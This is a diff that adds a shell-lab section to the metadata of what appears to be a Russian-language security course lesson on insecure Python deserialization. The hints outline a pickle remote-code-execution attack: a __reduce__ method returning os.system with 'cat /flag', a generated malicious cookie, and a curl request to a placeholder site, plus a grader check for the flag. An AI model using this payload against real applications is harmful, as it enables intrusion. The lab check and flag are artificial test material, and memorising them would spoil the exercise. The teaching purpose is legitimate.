@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 36
 summary: "Небезопасная десериализация в Python: pickle RCE через __reduce__, PyYAML unsafe_load, shelve и обходы."
+lab:
+  kind: shell
+  title: 'Практика: Python pickle RCE'
+  toolset: [core, python3, curl]
+  workdir: /home/student/task
+  files: [task.md, session.txt, gen.py]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Подтверди формат: `base64 -d session.txt | xxd | head -1` — сигнатура `80 04`.'
+    - 'Изучи `gen.py`: класс Exploit с `__reduce__`, возвращающий `(os.system, (''cat /flag'',))`.'
+    - 'Сгенерируй cookie-файл: `python3 gen.py > cookies.txt`.'
+    - 'Отправь cookie: `curl -s https://notes.example/ -b cookies.txt > found.txt`, затем `check`.'
 ---
 
 ## Вопрос, с которого всё начинается
